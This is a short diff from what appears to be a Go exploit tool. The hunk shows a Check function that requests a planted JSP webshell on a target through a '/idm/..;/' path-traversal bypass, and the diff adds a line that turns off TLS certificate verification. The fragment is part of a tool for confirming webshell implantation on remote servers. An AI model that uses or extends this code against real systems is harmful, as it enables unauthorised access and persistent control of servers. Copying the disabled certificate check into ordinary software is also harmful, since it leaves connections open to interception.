@@ -205,6 +205,7 @@ func generate_manifest(webshell_location, webshell string) string {
 func Check(url string) {
 	client := req.C()
 	client.SetProxyURL(Proxy_server)
+	client.EnableInsecureSkipVerify()
 	client.SetTimeout(2 * time.Second)
 	shell_url := url + "/idm/..;/" + "vs-s3rver.jsp"
 	resp, err := client.R().
